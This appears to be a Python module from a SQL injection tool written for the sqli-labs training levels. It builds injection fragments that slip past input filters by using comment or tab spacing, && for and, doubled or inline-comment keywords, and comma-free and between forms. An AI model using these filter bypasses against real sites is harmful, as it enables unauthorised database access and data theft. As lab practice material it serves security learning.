"""语法变体：同一段 SQL 在「被过滤」的环境下换一种合法写法。

sqli-labs 后段关卡会出手过滤，本模块就是对付这些过滤的：

    过滤空格 / 注释   Less-26        空格换成 /**/ 或 %09(tab)
    过滤 and / or     Less-25, 25a   and 换成 &&
    过滤 select       Less-27        换成 /*!50000select*/ 或双写
    过滤逗号          Less-26         substr(x,a,b) 换成 substr(x from a for b)
    过滤比较符        Less-27        > 换成 between

为什么不写死一种写法：因为过滤规则因关而异，写死了一定会在某一关卡死。
所以这里准备一组 Dialect（方言），由 conditions/oracle.py 用注入点自己验证哪种还能用。
"""
from typing import List


class Dialect:
    """一组「被允许的写法」。所有 SQL 片段都经过它渲染。"""

    def __init__(self, label: str = "plain", space: str = " ", andop: str = "and",
                 select: str = "select", from_: str = "from",
                 substr_mode: str = "comma", cmp_mode: str = "gt"):
        self.label = label
        self.space = space          # 拼接用的分隔符
        self.andop = andop          # and / &&
        self.select = select        # select / /*!50000select*/ / selselectect
        self.from_ = from_          # from / frfromom
        self.substr_mode = substr_mode  # comma / from_for / mid
        self.cmp_mode = cmp_mode    # gt / between

    # ---- 渲染 ----
    def and_cond(self, cond: str) -> str:
        """把一个条件渲染成注入语句：and 1=1 / && 1=1 / and/**/1=1"""
        return f"{self.andop}{self.space}{cond}"

    def substr(self, expr: str, pos: int, length: int) -> str:
        if self.substr_mode == "from_for":
            return f"substr({expr} from {pos} for {length})"
        if self.substr_mode == "mid":
            return f"mid({expr},{pos},{length})"
        return f"substr({expr},{pos},{length})"

    def gt(self, a: str, b) -> str:
        """a > b。between 写法用于 > 被过滤的场合。"""
        if self.cmp_mode == "between":
            return f"({a} between ({b}+1) and 99999999)"
        return f"({a}>{b})"

    def ge(self, a: str, b) -> str:
        """a >= b。求长度用它，避免 > 带来的差一错误。"""
        if self.cmp_mode == "between":
            return f"({a} between {b} and 99999999)"
        return f"({a}>={b})"

    def length(self, expr: str) -> str:
        return f"length({expr})"

    def __repr__(self) -> str:
        return f"<Dialect {self.label}>"


_BASE = [
    Dialect("plain"),
    Dialect("space_comment", space="/**/"),
    Dialect("space_tab", space="\t"),
    Dialect("and_amp", andop="&&"),
    Dialect("space_comment_and_amp", space="/**/", andop="&&"),
    Dialect("keyword_inline", space="/**/", select="/*!50000select*/",
            from_="/*!50000from*/"),
    Dialect("keyword_case", select="SeLeCt"),
    Dialect("keyword_double", space="/**/", select="selselectect",
            from_="frfromom"),
    Dialect("no_comma", space="/**/", substr_mode="from_for"),
    Dialect("between", space="/**/", cmp_mode="between"),
]


def candidates(only: str = "auto") -> List[Dialect]:
    """按「改动越小越先试」的顺序给出候选方言。

    only 用来强制指定，便于对比或跳过验证：
        auto | plain | space | and | keyword | comma
    强制指定时把它排在最前，再兜底 plain，方便确认某种写法是否可用。
    """
    if only in ("auto", "all"):
        return list(_BASE)

    mapping = {
        "plain": ["plain"],
        "space": ["space_comment", "space_tab", "plain"],
        "and": ["and_amp", "space_comment_and_amp", "plain"],
        "keyword": ["keyword_inline", "keyword_case", "keyword_double", "plain"],
        "comma": ["no_comma", "plain"],
    }
    if only not in mapping:
        raise ValueError(f"未知绕过模式: {only}")
    by_label = {d.label: d for d in _BASE}
    return [by_label[label] for label in mapping[only]]
